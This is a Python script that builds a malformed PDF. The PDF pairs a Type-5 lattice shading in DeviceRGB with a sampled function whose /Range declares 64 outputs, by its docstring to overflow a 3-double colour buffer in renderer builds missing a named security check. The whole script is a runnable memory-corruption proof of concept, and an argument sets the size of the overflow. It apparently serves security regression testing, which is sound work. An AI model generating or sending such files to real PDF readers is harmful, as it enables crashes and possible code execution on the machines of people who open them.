#!/usr/bin/env python3
"""Type-5 lattice shading with an oversized Function /Range (pre-27.2 check).

On builds without the CG-SEC-187882049 range-dimension check, the shading
function is evaluated into a per-sample colour buffer sized for the colour
space (3 doubles for DeviceRGB) while the function writes N doubles.
"""
import sys, zlib

def build(out, nout=64, ncomp=3, cs="/DeviceRGB", verts=256):
    objs = {}
    # colour space name -> no object needed for DeviceRGB; keep generic hook
    content = b"/Sh1 sh\n"
    objs[1] = b"<< /Type /Catalog /Pages 2 0 R >>"
    objs[2] = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"
    objs[3] = (b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] "
               b"/Resources << /Shading << /Sh1 5 0 R >> >> /Contents 4 0 R >>")
    objs[4] = b"<< /Length %d >>\nstream\n" % len(content) + content + b"endstream"
    # function: N outputs, 2 samples of 1 byte each (all zero)
    n = nout
    rng = " ".join(["0 1"] * n)
    dec = " ".join(["0 1"] * n)
    fsamples = bytes(2 * n)
    fdict = (f"<< /FunctionType 0 /Domain [0 1] /Range [{rng}] /Size [2] "
             f"/BitsPerSample 8 /Order 1 /Encode [0 1] /Decode [{dec}] "
             f"/Length {len(fsamples)} >>\nstream\n").encode() + fsamples + b"\nendstream"
    objs[6] = fdict
    # shading stream: 2 rows x 2 columns of (x,y,c) 8-bit values
    data = bytearray()
    for i in range(4):
        x = 0 if i in (0, 2) else 255
        y = 0 if i in (0, 1) else 255
        data += bytes([x, y, 0])
    sdict = (f"<< /ShadingType 5 /ColorSpace {cs} /BitsPerCoordinate 8 "
             f"/BitsPerComponent 8 /VerticesPerRow 2 /Decode [0 1 0 1 0 1] "
             f"/Function 6 0 R /Length {len(data)} >>\nstream\n").encode()
    objs[5] = sdict + bytes(data) + b"\nendstream"
    # serialise
    buf = bytearray(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")
    offs = {}
    for num in sorted(objs):
        offs[num] = len(buf)
        buf += b"%d 0 obj\n" % num + objs[num] + b"\nendobj\n"
    xref = len(buf)
    maxnum = max(objs)
    buf += b"xref\n0 %d\n" % (maxnum + 1)
    buf += b"0000000000 65535 f \n"
    for num in range(1, maxnum + 1):
        if num in offs:
            buf += b"%010d 00000 n \n" % offs[num]
        else:
            buf += b"0000000000 65535 f \n"
    buf += b"trailer\n<< /Size %d /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n" % (maxnum + 1, xref)
    open(out, "wb").write(buf)
    print(out, len(buf), "bytes, function range dim", n)

if __name__ == "__main__":
    out = sys.argv[1] if len(sys.argv) > 1 else "type5_shading.pdf"
    n = int(sys.argv[2]) if len(sys.argv) > 2 else 64
    build(out, n)
